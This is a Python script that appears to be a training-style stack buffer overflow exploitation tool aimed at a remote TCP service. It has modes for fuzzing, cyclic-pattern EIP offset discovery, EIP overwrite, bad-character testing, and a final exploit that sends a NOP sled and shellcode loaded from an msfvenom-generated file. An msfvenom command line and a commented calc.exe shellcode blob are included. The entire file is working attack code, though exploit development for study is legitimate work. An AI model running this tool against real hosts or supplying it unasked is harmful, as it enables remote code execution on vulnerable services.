#!/usr/bin/python3
#
# Tests vanilla_buffer_overflow
# 

import sys
import socket
import struct
import subprocess
import binascii

# Print script usage
def printUsage(scriptName):
	print("Usages:")
	print("	test - Sends simple string (AAAAA) with buffer size and buffer head for memory test")
	print("	{} test remoteHost remotePort buffSize buffHead".format(scriptName))
	print("	{} test 10.2.31.155 2048 5009 hello".format(scriptName))
	print("")

	print("	cyclic - Sends cyclic string to help identify EIP")
	print("	{} cyclic remoteHost remotePort buffSize buffHead".format(scriptName))
	print("	{} cyclic 10.2.31.155 2048 5009 hello".format(scriptName))
	print("")

	print("	eip - Writes content to EIP")
	print("	{} eip remoteHost remotePort buffSize buffHead eipContent eipOffset".format(scriptName))
	print("	{} eip 10.2.31.155 2048 5009 hello 01010101 1203".format(scriptName))
	print("")

	print("	badchars - Write badchars after EIP for badchar verification")
	print("	{} badchars remoteHost remotePort buffSize buffHead eipContent eipOffset".format(scriptName))
	print("	{} badchars 10.2.31.155 2048 5009 hello 01010101 1203".format(scriptName))
	print("")

	print("	exploit - Sends malicious payload via buffer overflow")
	print("	Shellcode example: msfvenom -p windows/exec cmd=calc.exe -b '\\x00' -f python -v payload EXITFUNC=thread -o myfile.py")
	print("	{} exploit remoteHost remotePort buffSize buffHead eipContent eipOffset nops shellCodeFile".format(scriptName))
	print("	{} exploit 10.2.31.155 2048 5009 hello 01010101 1203 10 myfile".format(scriptName))
	print("")

# Create payload based on mode and script arguments
def createPayload(mode, args):
	#print("Args: ", args)

	if mode == "test":
		return createTest_Payload(args)
	elif mode == "cyclic":
		return createCyclic_Payload(args)
	elif mode == "eip":
		return createEip_Payload(args)
	elif mode == "badchars":
		return createBadChar_Payload(args)
	elif mode == "exploit":
		return createExploitPayload(args)
	else:
		printUsage(scriptName)
		sys.exit(1);

def createTest_Payload(args):
	buffHead = str.encode(sys.argv[5])
	buffSize = int(sys.argv[4]) - len(buffHead)

	buffer = b'A' * buffSize

	payload = buffHead + buffer

	return payload

def createCyclic_Payload(args):
	buffHead = str.encode(sys.argv[5])
	buffSize = int(sys.argv[4]) - len(buffHead)
	
	process = subprocess.Popen(['/usr/bin/msf-pattern_create','-l', str(buffSize)],
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE)
	stdout, stderr = process.communicate()

	payload = buffHead + stdout

	return payload

def createEip_Payload(args):
	buffHead = str.encode(sys.argv[5])
	buffSize = int(sys.argv[4]) - len(buffHead)

	# EIP has to be a formatted 4 byte hex address (example: 625012f0)
	eipContent = sys.argv[6]
	eipOffset = int(sys.argv[7])

	# offset	
	offset = b'A' * eipOffset

	# eip
	eipContentLittleEndian = "".join(reversed([eipContent[i:i+2] for i in range(0, len(eipContent), 2)]))
	eip = binascii.unhexlify(eipContentLittleEndian)

	# tail
	tail = b'C' * (buffSize - len(offset) - len(eip))

	# payload
	payload = buffHead + offset + eip + tail

	return payload

def createBadChar_Payload(args):
	buffHead = str.encode(sys.argv[5])
	buffSize = int(sys.argv[4]) - len(buffHead)

	# EIP has to be a formatted 4 byte hex address (example: 625012f0)
	eipContent = sys.argv[6]
	eipOffset = int(sys.argv[7])

	# offset
	offset = b'A' * eipOffset

	# eip
	eipContentLittleEndian = "".join(reversed([eipContent[i:i+2] for i in range(0, len(eipContent), 2)]))
	eip = binascii.unhexlify(eipContentLittleEndian)
	
	# badchars
	badChars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
	
	# tail
	tail = b'C' * (buffSize - len(offset) - len(eip) - len(badChars))

	# payload
	payload = buffHead + offset + eip + badChars + tail

	return payload


def createExploitPayload(args):
	buffHead = str.encode(sys.argv[5])
	buffSize = int(sys.argv[4]) - len(buffHead)

	# EIP has to be a formatted 4 byte hex address (example: 625012f0)
	eipContent = sys.argv[6]
	eipOffset = int(sys.argv[7])
	
	# offset
	offset = b'A' * eipOffset

	# eip
	eipContentLittleEndian = "".join(reversed([eipContent[i:i+2] for i in range(0, len(eipContent), 2)]))
	eip = binascii.unhexlify(eipContentLittleEndian)

	# nops
	nopsSize = int(sys.argv[8])
	nops = b'\x90' * nopsSize

	# shellcode
	shellCodeFile = sys.argv[9]
	shellCodeModule = __import__(shellCodeFile)
	shellCode = shellCodeModule.payload

	# Example generated with msfvenom -p windows/exec cmd=calc.exe -b "\x00" -f python -v payload EXITFUNC=thread
	#shellCode =  b""
	#shellCode += b"\xb8\xeb\x55\xcf\x42\xd9\xc3\xd9\x74\x24\xf4\x5e"
	#shellCode += b"\x2b\xc9\xb1\x31\x83\xee\xfc\x31\x46\x0f\x03\x46"
	#shellCode += b"\xe4\xb7\x3a\xbe\x12\xb5\xc5\x3f\xe2\xda\x4c\xda"
	#shellCode += b"\xd3\xda\x2b\xae\x43\xeb\x38\xe2\x6f\x80\x6d\x17"
	#shellCode += b"\xe4\xe4\xb9\x18\x4d\x42\x9c\x17\x4e\xff\xdc\x36"
	#shellCode += b"\xcc\x02\x31\x99\xed\xcc\x44\xd8\x2a\x30\xa4\x88"
	#shellCode += b"\xe3\x3e\x1b\x3d\x80\x0b\xa0\xb6\xda\x9a\xa0\x2b"
	#shellCode += b"\xaa\x9d\x81\xfd\xa1\xc7\x01\xff\x66\x7c\x08\xe7"
	#shellCode += b"\x6b\xb9\xc2\x9c\x5f\x35\xd5\x74\xae\xb6\x7a\xb9"
	#shellCode += b"\x1f\x45\x82\xfd\xa7\xb6\xf1\xf7\xd4\x4b\x02\xcc"
	#shellCode += b"\xa7\x97\x87\xd7\x0f\x53\x3f\x3c\xae\xb0\xa6\xb7"
	#shellCode += b"\xbc\x7d\xac\x90\xa0\x80\x61\xab\xdc\x09\x84\x7c"
	#shellCode += b"\x55\x49\xa3\x58\x3e\x09\xca\xf9\x9a\xfc\xf3\x1a"
	#shellCode += b"\x45\xa0\x51\x50\x6b\xb5\xeb\x3b\xe1\x48\x79\x46"
	#shellCode += b"\x47\x4a\x81\x49\xf7\x23\xb0\xc2\x98\x34\x4d\x01"
	#shellCode += b"\xdd\xdb\xaf\x80\x2b\x74\x76\x41\x96\x19\x89\xbf"
	#shellCode += b"\xd4\x27\x0a\x4a\xa4\xd3\x12\x3f\xa1\x98\x94\xd3"
	#shellCode += b"\xdb\xb1\x70\xd4\x48\xb1\x50\xb7\x0f\x21\x38\x16"
	#shellCode += b"\xaa\xc1\xdb\x66"
	
	# tail
	tail = b'C' * (buffSize - len(offset) - len(eip) - len(nops) - len(shellCode))

	# payload
	payload = buffHead + offset + eip + nops + shellCode + tail

	return payload

# Check if input eipContent is a valid 4 byte hex string
def isValidEipContent(eipContent):
	if len(eipContent) != 8:
		return False
	
	# Check if it is valid hex value
	try:
		intVal = int(eipContent, 16) 
	except:
		return False

	return True


# Main execution block ##################################################################
#########################################################################################

DEFAULT_SOCKET_BUFF_SIZE = 1024
scriptName = sys.argv[0]

if (len(sys.argv) < 6) :
	printUsage(scriptName)
	sys.exit(1)	

# Avaiable modes
AVAILABLE_MODES = ['test', 'cyclic', 'eip', 'badchars', 'exploit']
mode = sys.argv[1]

if mode not in AVAILABLE_MODES:
	printUsage(scriptName)
	sys.exit(1);

# Check mode params
if mode in ['eip', 'badchars'] and len(sys.argv) != 8:
	printUsage(scriptName)
	sys.exit(1);

if mode == "exploit" and len(sys.argv) != 10:
	printUsage(scriptName)
	sys.exit(1);

if mode in ['eip', 'badchars', 'exploit'] and not isValidEipContent(sys.argv[6]):
	print("Error: eipContent has to be formatted as a 4 byte hex string. Example: 625012f0")
	printUsage(scriptName)
	sys.exit(1);

# Set remote host and port for exploitation
rhost = sys.argv[2]
rport = int(sys.argv[3])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	# Connect to rhost and rport
	connect = s.connect((rhost, rport))

	# Application connection return
	r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)
	print(r)

	# Generate payload
	buffPayload = createPayload(mode, sys.argv[2:])
	#print(buffPayload)

	# Send payload
	print("Sending payload with size {}...".format(len(buffPayload)))
	s.send(buffPayload)

	# Application payload return
	r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)
	print(r)
except KeyboardInterrupt:
	print("Keyboard Interrupt")
except:
	print("Unexpected error:", sys.exc_info()[0])
	raise
finally:
	s.close()

